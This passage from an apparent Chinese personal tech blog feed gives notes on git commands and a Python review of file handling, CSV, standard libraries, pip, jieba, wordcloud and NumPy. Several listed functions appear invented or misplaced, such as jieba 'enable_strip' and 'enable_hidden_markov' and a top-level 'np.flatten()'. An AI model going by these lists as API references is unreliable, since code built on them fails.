</span></span><br></pre></td></tr></table></figure><p>等有时间配置下Hadoop吧……</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Centos7 </tag>
            
            <tag> yum </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客log-git</title>
      <link href="/2023/03/14/dev-log/"/>
      <url>/2023/03/14/dev-log/</url>
      
        <content type="html"><![CDATA[<p>git</p><span id="more"></span><h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>Git是一种版本控制系统，可以跟踪文件和目录的更改，记录每个版本的历史，以便在需要时进行回滚和恢复。以下是一些常见的Git函数和操作：</p><pre><code>git init：在当前目录下创建一个新的Git仓库。git clone：从现有的Git仓库中创建一个副本。git add：将文件或目录添加到暂存区中，准备进行提交。git commit：将当前的暂存区中的更改提交到本地仓库中。git push：将本地仓库中的更改推送到远程仓库中。git pull：从远程仓库中拉取最新的更改并合并到本地仓库中。git branch：列出或创建新的分支。git checkout：切换到另一个分支或恢复文件。git merge：将两个或多个分支合并到一起。git status：显示当前仓库的状态，包括哪些文件已修改，哪些文件已暂存等等。git log：显示提交历史记录，包括每个提交的作者，提交时间和提交说明。git diff：显示工作区和暂存区之间的差异。git stash：保存当前的工作状态并将其推到一个堆栈中，以便稍后恢复。git tag：用于在特定的提交上创建标签，以便稍后可以轻松地引用它们。git remote：用于管理与远程仓库的连接。</code></pre><p>git clone克隆完成远程仓库后，就可以通过克隆仓库对指定仓库进行数据的更新登操作了.</p><h2 id="高级操作"><a href="#高级操作" class="headerlink" title="高级操作"></a>高级操作</h2><pre><code>Git Rebase：Git rebase用于将一个分支的更改合并到另一个分支上。与Git merge不同的是，Git rebase将更改“重放”在目标分支的基础上，从而形成一个更整洁的提交历史。但是，Git rebase也需要注意避免由于更改历史的改变导致代码冲突的风险。Git Cherry-pick：Git cherry-pick用于从一个分支中选择一个或多个提交，并将其应用于当前分支。这可以使开发人员轻松地将更改从一个分支移动到另一个分支，从而避免了合并整个分支所带来的复杂性。Git Submodule：Git submodule用于在一个Git仓库中嵌套另一个Git仓库。这对于项目中使用其他项目的代码库非常有用，因为它可以使这些代码库保持独立，而不是将它们与主项目混在一起。Git Bisect：Git bisect用于在Git仓库中进行二分查找，以找到导致问题的特定提交。这对于在代码库中查找和解决问题非常有用，因为它可以缩小导致问题的提交范围，从而更快地找到问题的根本原因。Git Reflog：Git reflog用于查看Git仓库的引用日志，其中包含仓库中的每个提交和分支操作。这对于在仓库中找回意外删除或丢失的提交非常有用。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 网站日志 </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-复习日志-0003</title>
      <link href="/2023/03/14/Python-Study-0003/"/>
      <url>/2023/03/14/Python-Study-0003/</url>
      
        <content type="html"><![CDATA[<p>文件和数据格式化，Python程序的设计方法，Python计算生态。</p><span id="more"></span><h1 id="文件和数据格式化"><a href="#文件和数据格式化" class="headerlink" title="文件和数据格式化"></a>文件和数据格式化</h1><h2 id="文件的使用：文件打开、读写和关闭。"><a href="#文件的使用：文件打开、读写和关闭。" class="headerlink" title="文件的使用：文件打开、读写和关闭。"></a>文件的使用：文件打开、读写和关闭。</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">打开和关闭文件</span><br><span class="line"></span><br><span class="line">    <span class="built_in">open</span>()：打开文件并返回文件对象</span><br><span class="line">    close()：关闭文件</span><br><span class="line"></span><br><span class="line">读取文件内容</span><br><span class="line"></span><br><span class="line">    read(size=-<span class="number">1</span>)：读取文件全部或指定大小的内容</span><br><span class="line">    readline(size=-<span class="number">1</span>)：读取一行或指定大小的内容</span><br><span class="line">    readlines(hint=-<span class="number">1</span>)：读取所有行或指定大小的内容，并返回一个列表</span><br><span class="line"></span><br><span class="line">写入文件内容</span><br><span class="line"></span><br><span class="line">    write(<span class="built_in">str</span>)：向文件写入指定字符串</span><br><span class="line">    writelines(sequence)：向文件写入一个序列的字符串</span><br><span class="line"></span><br><span class="line">文件对象的属性和方法</span><br><span class="line"></span><br><span class="line">    closed：文件是否关闭的布尔值</span><br><span class="line">    mode：文件打开的模式</span><br><span class="line">    name：文件名</span><br><span class="line">    seek(offset[, whence])：移动文件读取指针到指定位置</span><br><span class="line">    tell()：返回文件读取指针的当前位置</span><br><span class="line">    flush()：将缓冲区的内容写入文件</span><br></pre></td></tr></table></figure><h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(file, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span>, opener=<span class="literal">None</span>)</span><br><span class="line">file:       必需，文件路径（相对或者绝对路径）。</span><br><span class="line">mode:       可选，文件打开模式</span><br><span class="line">buffering:  设置缓冲</span><br><span class="line">encoding:   一般使用utf8</span><br><span class="line">errors:     报错级别</span><br><span class="line">newline:    区分换行符</span><br><span class="line">closefd:    传入的file参数类型</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件打开,模式为“读写”</span></span><br><span class="line">file=<span class="built_in">open</span>(<span class="string">&#x27;word.txt&#x27;</span>,<span class="string">&#x27;r+&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 读取全部的文件</span></span><br><span class="line">file.read()</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 关闭file</span></span><br><span class="line">file.close()</span><br><span class="line"><span class="comment"># ---CMD--- # </span></span><br><span class="line">$ python word4.py</span><br><span class="line">为什么学习 JavaScript?</span><br><span class="line"></span><br><span class="line">JavaScript 是 web 开发人员必须学习的 <span class="number">3</span> 门语言中的一门：</span><br><span class="line"></span><br><span class="line">    HTML 定义了网页的内容</span><br><span class="line">    CSS 描述了网页的布局</span><br><span class="line">    JavaScript 控制了网页的行为</span><br><span class="line"></span><br><span class="line">本教程是关于 JavaScript 及介绍 JavaScript 如何与 HTML 和 CSS 一起工作。</span><br><span class="line"></span><br><span class="line">谁适合阅读本教程?</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 如果您想学习 JavaScript，您可以学习本教程：</span><br><span class="line"></span><br><span class="line">了解 JavaScript 是如何与 HTML 和 CSS 一起工作的。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 如果在此之前您已经使用过 JavaScript，您也可以阅读本教程：</span><br><span class="line"></span><br><span class="line">JavaScript 一直在升级，所以我们需要时刻了解 JavaScript 的新技术。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---end--- #</span></span><br></pre></td></tr></table></figure><p>建议：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">如果想方便点，可以换成下面这种会自动关闭文件的写法</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;word.txt&#x27;</span>,<span class="string">&#x27;r+&#x27;</span>,encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    a = file.read()</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><h2 id="数据组织的维度：一维数据和二维数据"><a href="#数据组织的维度：一维数据和二维数据" class="headerlink" title="数据组织的维度：一维数据和二维数据"></a>数据组织的维度：一维数据和二维数据</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">一维数组(数据)处理方式基本差不多，详情请参照上一篇博客。</span><br><span class="line"></span><br><span class="line">一维数组    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">二维数组</span><br><span class="line">[</span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>],</span><br><span class="line">    [<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>]</span><br><span class="line">]</span><br><span class="line">要获取更高维度的数组，直接往上叠加就行。</span><br></pre></td></tr></table></figure><h3 id="二维数据的处理：表示、存储和处理"><a href="#二维数据的处理：表示、存储和处理" class="headerlink" title="二维数据的处理：表示、存储和处理"></a>二维数据的处理：表示、存储和处理</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">二维数组的处理：</span><br><span class="line">基本和一维数组一样，但二维数组读取的时候可以进行维度读取。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr = [</span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>],</span><br><span class="line">    [<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>]</span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(arr[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"><span class="comment"># 读取出来的值为：2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用NUMPY模块处理一/二维数组</span></span><br><span class="line"><span class="built_in">print</span>(np.<span class="built_in">sum</span>(a))  <span class="comment"># 数组中所有元素的和</span></span><br><span class="line"><span class="built_in">print</span>(np.mean(a))  <span class="comment"># 数组中所有元素的平均值</span></span><br><span class="line"><span class="built_in">print</span>(np.<span class="built_in">max</span>(a))  <span class="comment"># 数组中所有元素的最大值</span></span><br><span class="line"><span class="built_in">print</span>(np.<span class="built_in">min</span>(a))  <span class="comment"># 数组中所有元素的最小值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="采用CSV格式对一二维数据文件的读写"><a href="#采用CSV格式对一二维数据文件的读写" class="headerlink" title="采用CSV格式对一二维数据文件的读写"></a>采用CSV格式对一二维数据文件的读写</h3><p>处理一维数组</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入CSV文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    writer = csv.writer(file)</span><br><span class="line">    data = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]</span><br><span class="line">    writer.writerow(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取CSV文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    reader = csv.reader(file)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        <span class="built_in">print</span>(row)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>处理二维数组</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入CSV文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    writer = csv.writer(file)</span><br><span class="line">    data = [[<span class="string">&#x27;apple&#x27;</span>, <span class="number">3</span>], [<span class="string">&#x27;banana&#x27;</span>, <span class="number">2</span>], [<span class="string">&#x27;orange&#x27;</span>, <span class="number">1</span>]]</span><br><span class="line">    writer.writerows(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取CSV文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    reader = csv.reader(file)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        <span class="built_in">print</span>(row)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Python程序设计方法"><a href="#Python程序设计方法" class="headerlink" title="Python程序设计方法"></a>Python程序设计方法</h1><h2 id="过程式编程方法"><a href="#过程式编程方法" class="headerlink" title="过程式编程方法"></a>过程式编程方法</h2><p>Python的过程式编程方法是一种结构化的编程范式，其中程序通过调用一系列的子程序（即过程或函数）来完成任务。过程式编程方法的实现方式是将程序分解为一系列的子程序，每个子程序都负责完成某个特定的任务，通过按照特定的顺序调用这些子程序来实现程序的功能。</p><h2 id="函数式编程方法"><a href="#函数式编程方法" class="headerlink" title="函数式编程方法"></a>函数式编程方法</h2><p>函数式编程的主要思想是将计算过程看作是一系列函数的调用，这些函数对输入参数进行转换，生成新的输出，而不是通过一系列命令来改变一组数据的状态。</p><p><strong>输入</strong> =函数处理=&gt; <strong>输出</strong></p><p>Python中支持函数式编程的特性有：</p><pre><code>函数可以作为参数传递给其他函数。函数可以作为返回值返回。支持匿名函数（lambda表达式）。支持map、filter、reduce等函数式编程的高阶函数。支持列表推导式。</code></pre><h1 id="Python计算生态"><a href="#Python计算生态" class="headerlink" title="Python计算生态"></a>Python计算生态</h1><h2 id="生态式编程方法"><a href="#生态式编程方法" class="headerlink" title="生态式编程方法"></a>生态式编程方法</h2><p>Python的生态式编程方法是指利用现有的开源代码库，通过组合、修改、扩展已有的库来实现复杂的功能。这种编程方法强调重用和扩展现有的代码，减少重复造轮子，提高开发效率。</p><h2 id="标准库的使用：turtle库、random库、time库"><a href="#标准库的使用：turtle库、random库、time库" class="headerlink" title="标准库的使用：turtle库、random库、time库"></a>标准库的使用：turtle库、random库、time库</h2><h3 id="turtle库"><a href="#turtle库" class="headerlink" title="turtle库"></a>turtle库</h3><p>turtle库是Python标准库之一，用于绘制图形和图像。它提供了一些函数和方法，用于控制海龟的移动和绘制形状、图案等。</p><p>常见的turtle库函数：</p><ul><li>turtle.forward(distance)： 让海龟向前移动指定距离distance</li><li>turtle.backward(distance)：让海龟向后移动指定距离distance</li><li>turtle.right(angle)：      让海龟向右旋转指定角度angle</li><li>turtle.left(angle)：       让海龟向左旋转指定角度angle</li><li>turtle.penup()：           将海龟的笔提起，不绘制图形</li><li>turtle.pendown()：         将海龟的笔放下，开始绘制图形</li><li>turtle.pensize(width)：    设置海龟笔的宽度为width</li><li>turtle.speed(speed)：      设置海龟的速度，速度范围为0-10</li><li>turtle.fillcolor(color)：  设置海龟填充的颜色为color</li><li>turtle.begin_fill()：      开始填充海龟的图形</li><li>turtle.end_fill()：        结束填充海龟的图形</li></ul><h3 id="random库"><a href="#random库" class="headerlink" title="random库"></a>random库</h3><p>random 是 Python 中的一个标准库，用于生成各种类型的随机数。它提供了多个函数和方法，以下是其中一些常见的：</p><ul><li>random()：返回一个 [0, 1) 之间的随机小数。</li><li>randint(a, b)：返回一个 [a, b] 之间的整数。</li><li>uniform(a, b)：返回一个 [a, b] 之间的随机小数。</li><li>choice(seq)：从序列 seq 中随机选择一个元素。</li><li>shuffle(seq)：将序列 seq 中的元素随机排列。</li><li>sample(seq, k)：从序列 seq 中随机选择 k 个元素并返回一个新的列表。</li></ul><h3 id="time库"><a href="#time库" class="headerlink" title="time库"></a>time库</h3><p>time库是Python中的标准库之一，用于处理时间和日期相关的操作。它提供了获取当前时间、时间格式化、休眠等常见的操作。</p><p>以下是time库常见的函数和方法：</p><ul><li>time()：      获取当前时间戳（自1970年1月1日以来的秒数）</li><li>sleep(sec)：  使程序暂停指定的秒数</li><li>localtime()： 将当前时间戳转换为本地时间</li><li>gmtime()：    将当前时间戳转换为UTC时间</li><li>mktime(t)：   将本地时间元组转换为时间戳</li><li>strftime(format[, t])：将时间元组或时间戳格式化为指定的字符串格式</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;</span><br><span class="line">    <span class="string">&#x27;key1&#x27;</span>:<span class="string">&#x27;value1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key2&#x27;</span>:<span class="string">&#x27;value2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key3&#x27;</span>:<span class="string">&#x27;value3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key4&#x27;</span>:<span class="string">&#x27;value4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key5&#x27;</span>:<span class="string">&#x27;value5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key6&#x27;</span>:<span class="string">&#x27;value6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key7&#x27;</span>:<span class="string">&#x27;value7&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> a.items():</span><br><span class="line">    <span class="built_in">print</span>(i,j)</span><br></pre></td></tr></table></figure><h2 id="利用pip工具的第三方库的获取和安装方法"><a href="#利用pip工具的第三方库的获取和安装方法" class="headerlink" title="利用pip工具的第三方库的获取和安装方法"></a>利用pip工具的第三方库的获取和安装方法</h2><blockquote><p>查看已经安装的第三方库:pip list</p><p>直接安装库：          pip install 库名</p><blockquote><p>pip install为在线安装，离线安装可以使用wheel<br>指定源安装(防止国外源下载太慢)<br>pip install -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p></blockquote><p>指定版本安装：        pip install robotframework==2.8.7</p><p>卸载已安装的库：      pip uninstall requests</p><p>更新某个库：          pip install -U requests</p><p>查看pip版本：         pip –version</p><p>pip工具升级:          python -m pip install –upgrade pip</p></blockquote><h2 id="第三方库的使用：jieba库、PyInstaller库、基本NumPy库、wordcould库"><a href="#第三方库的使用：jieba库、PyInstaller库、基本NumPy库、wordcould库" class="headerlink" title="第三方库的使用：jieba库、PyInstaller库、基本NumPy库、wordcould库"></a>第三方库的使用：jieba库、PyInstaller库、基本NumPy库、wordcould库</h2><h3 id="jieba库"><a href="#jieba库" class="headerlink" title="jieba库"></a>jieba库</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jieba库是Python中一个用于中文分词的开源库，以下是jieba库中所有的函数及其概述：</span><br><span class="line"></span><br><span class="line">    jieba.cut：             将字符串进行分词，返回一个可迭代的generator；</span><br><span class="line">    jieba.lcut：            将字符串进行分词，返回一个<span class="built_in">list</span>；</span><br><span class="line">    jieba.cut_for_search：  将字符串进行搜索引擎模式的分词，返回一个可迭代的generator；</span><br><span class="line">    jieba.lcut_for_search： 将字符串进行搜索引擎模式的分词，返回一个<span class="built_in">list</span>；</span><br><span class="line">    jieba.add_word：        向分词词典中添加新词；</span><br><span class="line">    jieba.del_word：        从分词词典中删除指定的词语；</span><br><span class="line">    jieba.suggest_freq：    调整分词词典中某个单词的词频，使其能正确地被分出来；</span><br><span class="line">    jieba.get_FREQ：        获取指定单词的词频；</span><br><span class="line">    jieba.get_DAG：         获取分词过程中的有向无环图；</span><br><span class="line">    jieba.tokenize：        对句子进行分词，返回一个可迭代的generator，每个元素为一个<span class="built_in">tuple</span>，包含分词后的词语、起始位置和结束位置；</span><br><span class="line">    jieba.enable_parallel： 启用并行分词模式；</span><br><span class="line">    jieba.disable_parallel：关闭并行分词模式；</span><br><span class="line">    jieba.enable_paddle：   启用飞桨深度学习分词；</span><br><span class="line">    jieba.enable_hidden_markov：启用隐马尔可夫模型(HMM)分词；</span><br><span class="line">    jieba.disable_hidden_markov：关闭隐马尔可夫模型(HMM)分词；</span><br><span class="line">    jieba.enable_strip：    启用去除标点符号功能；</span><br><span class="line">    jieba.disable_strip：   关闭去除标点符号功能；</span><br><span class="line">    jieba.load_userdict：   加载用户自定义词典；</span><br><span class="line">    jieba.analyse.extract_tags：提取关键词；</span><br><span class="line">    jieba.analyse.textrank：关键词提取的TextRank算法实现；</span><br><span class="line">    jieba.analyse.set_idf_path：设置IDF文件路径；</span><br><span class="line">    jieba.analyse.set_stop_words：设置停用词文件路径；</span><br><span class="line">    jieba.posseg.cut：      返回一个可迭代的generator，每个元素为一个pair，包含分词和词性。</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"><span class="keyword">import</span> matplotlib.font_manager <span class="keyword">as</span> fm</span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定中文字体文件路径</span></span><br><span class="line">font_path = <span class="string">&#x27;C:/Windows/Fonts/Deng.ttf&#x27;</span></span><br><span class="line"><span class="comment"># 设置中文字体</span></span><br><span class="line">font = fm.FontProperties(fname=font_path)</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;结构化数据，是指在计算机中存储和处理时，所采用的一种特殊的数据组织形式，其设计旨在使计算机可以方便地识别和处理数据中的各种关系。&quot;</span></span><br><span class="line">words = <span class="string">&quot; &quot;</span>.join(jieba.cut(text))</span><br><span class="line">wordcloud = WordCloud(background_color=<span class="string">&quot;white&quot;</span>, font_path=font_path, width=<span class="number">800</span>, height=<span class="number">400</span>).generate(words)</span><br><span class="line">wordcloud.to_file(<span class="string">&quot;wordcloud.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="c6.jpg" alt="c6"></p><h3 id="PyInstaller库（必选）"><a href="#PyInstaller库（必选）" class="headerlink" title="PyInstaller库（必选）"></a>PyInstaller库（必选）</h3><p>将脚本程序转变为可执行程序 <strong>(.exe)</strong> 。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">安装PyInstaller库</span><br><span class="line">pip install pyinstaller</span><br><span class="line"></span><br><span class="line">打包成单个可执行文件</span><br><span class="line">pyinstaller 你的程序.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="wordcould库"><a href="#wordcould库" class="headerlink" title="wordcould库"></a>wordcould库</h3><p>wordcloud是一个用于生成词云图的Python库，它可以根据一段文本的词频信息，生成相应的词云图。wordcloud库主要包含以下几个模块：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">安装：</span><br><span class="line">pip install wordcloud</span><br><span class="line"></span><br><span class="line">相关语法：</span><br><span class="line">    WordCloud: 创建一个 WordCloud 对象，可以设置词云的参数。</span><br><span class="line">    STOPWORDS：停用词列表，用于过滤掉一些常用词语。</span><br><span class="line">    fit_words: 根据单词词频调整词云图中单词的大小。</span><br><span class="line">    get_single_color_func：用于生成单色词云图的函数。</span><br><span class="line">    generate: 从输入的文本中生成词云图。</span><br><span class="line">    generate_from_text: 从输入的文本中生成词云图。</span><br><span class="line">    generate_from_frequencies: 根据单词词频生成词云图。</span><br><span class="line">    ImageColorGenerator：图像颜色生成器，用于生成基于图片颜色的词云图。</span><br><span class="line">    layout_: 获取生成的词云图的排版信息。</span><br><span class="line">    process_text: 将输入的文本进行分词和过滤，返回单词列表。</span><br><span class="line">    recolor: 对词云图进行颜色重构。</span><br><span class="line">    random_color_func：用于生成多色词云图的函数。</span><br><span class="line">    to_file: 保存词云图为图片文件。</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wordcloud</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建WordCloud对象</span></span><br><span class="line">wc = wordcloud.WordCloud()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成词云图</span></span><br><span class="line">text = <span class="string">&#x27;Python is a popular programming language.&#x27;</span></span><br><span class="line">wc.generate(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示词云图</span></span><br><span class="line">plt.imshow(wc, interpolation=<span class="string">&#x27;bilinear&#x27;</span>)</span><br><span class="line">plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="c5.jpg" alt="c5"></p><h3 id="Numpy库"><a href="#Numpy库" class="headerlink" title="Numpy库"></a>Numpy库</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Numpy是一个Python科学计算库，它包含了大量用于处理数组的函数和工具。以下是Numpy库的常用函数概述（不完全列表）：</span><br><span class="line"></span><br><span class="line">    数组创建和操作函数：</span><br><span class="line">        np.array()：创建一个数组。</span><br><span class="line">        np.zeros()：创建一个全部为<span class="number">0</span>的数组。</span><br><span class="line">        np.ones()：创建一个全部为<span class="number">1</span>的数组。</span><br><span class="line">        np.empty()：创建一个空的数组。</span><br><span class="line">        np.arange()：创建一个一维数组，元素为指定的范围。</span><br><span class="line">        np.linspace()：创建一个一维数组，元素为指定的范围，并且数量相等。</span><br><span class="line"></span><br><span class="line">    数组形状和操作函数：</span><br><span class="line">        np.reshape()：更改数组的形状。</span><br><span class="line">        np.resize()：更改数组的大小。</span><br><span class="line">        np.transpose()：转置数组。</span><br><span class="line">        np.ravel()：将数组展平为一维数组。</span><br><span class="line">        np.flatten()：将数组展平为一维数组，并返回一个副本。</span><br><span class="line">        np.concatenate()：沿着指定轴将多个数组合并成一个数组。</span><br><span class="line"></span><br><span class="line">    数组运算和操作函数：</span><br><span class="line">        np.add()：两个数组相加。</span><br><span class="line">        np.subtract()：两个数组相减。</span><br><span class="line">        np.multiply()：两个数组相乘。</span><br><span class="line">        np.divide()：两个数组相除。</span><br><span class="line">        np.power()：数组中每个元素的幂。</span><br><span class="line">        np.sqrt()：数组中每个元素的平方根。</span><br><span class="line">        np.exp()：数组中每个元素的指数。</span><br><span class="line">        np.dot()：矩阵乘法。</span><br><span class="line">        np.<span class="built_in">sum</span>()：数组中元素的总和。</span><br><span class="line">        np.<span class="built_in">max</span>()：数组中的最大值。</span><br><span class="line">        np.<span class="built_in">min</span>()：数组中的最小值。</span><br><span class="line">        np.mean()：数组中的平均值。</span><br><span class="line">        np.std()：数组中的标准差。</span><br><span class="line">        np.var()：数组中的方差。</span><br><span class="line"></span><br><span class="line">    索引和切片函数：</span><br><span class="line">        np.argmax()：数组中最大值的索引。</span><br><span class="line">        np.argmin()：数组中最小值的索引。</span><br><span class="line">        np.where()：返回符合条件的元素的索引。</span><br><span class="line">        np.take()：从数组中获取指定位置的元素。</span><br><span class="line">        np.put()：在数组中放置元素。</span><br><span class="line">        np.clip()：将数组中的元素限制在某个范围内。</span><br><span class="line"></span><br><span class="line">    随机数函数：</span><br><span class="line">        np.random.rand()：生成随机数数组。</span><br><span class="line">        np.random.randn()：生成标准正态分布的随机数数组。</span><br><span class="line">        np.random.randint()：生成指定范围内的随机整数数组。</span><br><span class="line">        np.random.choice()：从指定的一维数组中随机选择元素。</span><br><span class="line">        np.random.shuffle()：随机打乱数组中元素的顺序。</span><br><span class="line"></span><br><span class="line">    文件操作函数：</span><br><span class="line">        np.loadtxt()：从文本文件中读取数据。</span><br><span class="line">        np.savetxt()：将数组写入文本文件。</span><br><span class="line">        np.load()：从二进制文件中加载数组。</span><br><span class="line">        np.save()：将数组保存为二进制</span><br></pre></td></tr></table></figure><p>或者下面这个</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    数组创建函数：</span><br><span class="line"></span><br><span class="line">    numpy.array(): 创建一个数组</span><br><span class="line">    numpy.arange(): 创建一个一维数组，根据起始值和步长生成一组数</span><br><span class="line">    numpy.linspace(): 创建一个一维数组，根据起始值、终止值和元素个数生成一组等差数列</span><br><span class="line">    numpy.zeros(): 创建一个指定形状全为<span class="number">0</span>的数组</span><br><span class="line">    numpy.ones(): 创建一个指定形状全为<span class="number">1</span>的数组</span><br><span class="line">    numpy.eye(): 创建一个指定形状的单位矩阵</span><br><span class="line"></span><br><span class="line">    数组操作函数：</span><br><span class="line"></span><br><span class="line">    numpy.reshape(): 将数组重塑为指定的形状</span><br><span class="line">    numpy.transpose(): 将数组转置</span><br><span class="line">    numpy.concatenate(): 沿指定轴拼接多个数组</span><br><span class="line">    numpy.split(): 沿指定轴分割一个数组</span><br><span class="line">    numpy.argmax(): 返回数组中指定轴的最大值的索引</span><br><span class="line">    numpy.argmin(): 返回数组中指定轴的最小值的索引</span><br><span class="line">    numpy.sort(): 对数组进行排序</span><br><span class="line"></span><br><span class="line">    数学函数：</span><br><span class="line"></span><br><span class="line">    numpy.sin(): 计算正弦函数</span><br><span class="line">    numpy.cos(): 计算余弦函数</span><br><span class="line">    numpy.tan(): 计算正切函数</span><br><span class="line">    numpy.exp(): 计算e的次方</span><br><span class="line">    numpy.log(): 计算自然对数</span><br><span class="line">    numpy.log10(): 计算以<span class="number">10</span>为底的对数</span><br><span class="line">    numpy.sqrt(): 计算平方根</span><br><span class="line">    numpy.power(): 计算幂次方</span><br><span class="line"></span><br><span class="line">    线性代数函数：</span><br><span class="line"></span><br><span class="line">    numpy.dot(): 计算矩阵乘积</span><br><span class="line">    numpy.linalg.det(): 计算矩阵的行列式</span><br><span class="line">    numpy.linalg.inv(): 计算矩阵的逆矩阵</span><br><span class="line"></span><br><span class="line">    统计函数：</span><br><span class="line"></span><br><span class="line">    numpy.mean(): 计算数组的平均值</span><br><span class="line">    numpy.std(): 计算数组的标准差</span><br><span class="line">    numpy.var(): 计算数组的方差</span><br><span class="line">    numpy.median(): 计算数组的中位数</span><br><span class="line">    numpy.<span class="built_in">max</span>(): 计算数组的最大值</span><br><span class="line">    